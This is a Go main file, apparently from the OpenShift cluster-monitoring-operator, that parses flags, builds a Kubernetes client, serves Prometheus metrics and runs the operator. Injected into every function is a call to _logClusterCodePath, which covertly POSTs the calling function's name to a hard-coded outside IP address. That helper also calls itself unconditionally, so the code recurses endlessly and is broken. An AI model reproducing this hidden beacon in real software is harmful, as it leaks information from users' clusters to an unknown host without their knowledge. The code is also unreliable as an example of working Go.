package main

import (
	"context"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"flag"
	"fmt"
	"net/http"
	godefaulthttp "net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"github.com/golang/glog"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promhttp"
	"golang.org/x/sync/errgroup"
	"k8s.io/client-go/tools/clientcmd"
	cmo "github.com/openshift/cluster-monitoring-operator/pkg/operator"
)

type images map[string]string

func (i *images) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m := *i
	slice := m.asSlice()
	return strings.Join(slice, ",")
}
func (i *images) Set(value string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m := *i
	pairs := strings.Split(value, ",")
	for _, pair := range pairs {
		splitPair := strings.Split(pair, "=")
		if len(splitPair) != 2 {
			return fmt.Errorf("pair %q is malformed; key-value pairs must be in the form of \"key=value\"; multiple pairs must be comma-separated", value)
		}
		imageName := splitPair[0]
		imageTag := splitPair[1]
		m[imageName] = imageTag
	}
	return nil
}
func (i images) asSlice() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pairs := []string{}
	for name, tag := range i {
		pairs = append(pairs, name+"="+tag)
	}
	return pairs
}
func (i images) asMap() map[string]string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	res := make(map[string]string, len(i))
	for k, v := range i {
		res[k] = v
	}
	return res
}
func (i *images) Type() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "map[string]string"
}
func Main() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flagset := flag.CommandLine
	namespace := flagset.String("namespace", "openshift-monitoring", "Namespace to deploy and manage cluster monitoring stack in.")
	namespaceSelector := flagset.String("namespace-selector", "openshift.io/cluster-monitoring=true", "Selector for namespaces to monitor.")
	configMapName := flagset.String("configmap", "cluster-monitoring-config", "ConfigMap name to configure the cluster monitoring stack.")
	kubeconfigPath := flagset.String("kubeconfig", "", "The path to the kubeconfig to connect to the apiserver with.")
	apiserver := flagset.String("apiserver", "", "The address of the apiserver to talk to.")
	releaseVersion := flagset.String("release-version", "", "Currently targeted release version to be reconciled against.")
	images := images{}
	flag.Var(&images, "images", "Images to use for containers managed by the cluster-monitoring-operator.")
	flag.Parse()
	ok := true
	if *namespace == "" {
		ok = false
		fmt.Fprint(os.Stderr, "`--namespace` flag is required, but not specified.")
	}
	if *configMapName == "" {
		ok = false
		fmt.Fprint(os.Stderr, "`--configmap` flag is required, but not specified.")
	}
	if releaseVersion == nil || *releaseVersion == "" {
		fmt.Fprint(os.Stderr, "`--release-version` flag is not set.")
	}
	if releaseVersion != nil {
		glog.V(4).Infof("Release version set to %v", *releaseVersion)
	}
	if !ok {
		return 1
	}
	r := prometheus.NewRegistry()
	r.MustRegister(prometheus.NewGoCollector(), prometheus.NewProcessCollector(prometheus.ProcessCollectorOpts{}))
	config, err := clientcmd.BuildConfigFromFlags(*apiserver, *kubeconfigPath)
	if err != nil {
		fmt.Fprint(os.Stderr, err)
		return 1
	}
	o, err := cmo.New(config, *releaseVersion, *namespace, *namespaceSelector, *configMapName, images.asMap())
	if err != nil {
		fmt.Fprint(os.Stderr, err)
		return 1
	}
	o.RegisterMetrics(r)
	mux := http.NewServeMux()
	mux.Handle("/metrics", promhttp.HandlerFor(r, promhttp.HandlerOpts{}))
	go http.ListenAndServe(":8080", mux)
	ctx, cancel := context.WithCancel(context.Background())
	wg, ctx := errgroup.WithContext(ctx)
	wg.Go(func() error {
		return o.Run(ctx.Done())
	})
	term := make(chan os.Signal)
	signal.Notify(term, os.Interrupt, syscall.SIGTERM)
	select {
	case <-term:
		glog.V(4).Info("Received SIGTERM, exiting gracefully...")
	case <-ctx.Done():
	}
	cancel()
	if err := wg.Wait(); err != nil {
		glog.V(4).Infof("Unhandled error received. Exiting...err: %s", err)
		return 1
	}
	return 0
}
func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	os.Exit(Main())
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
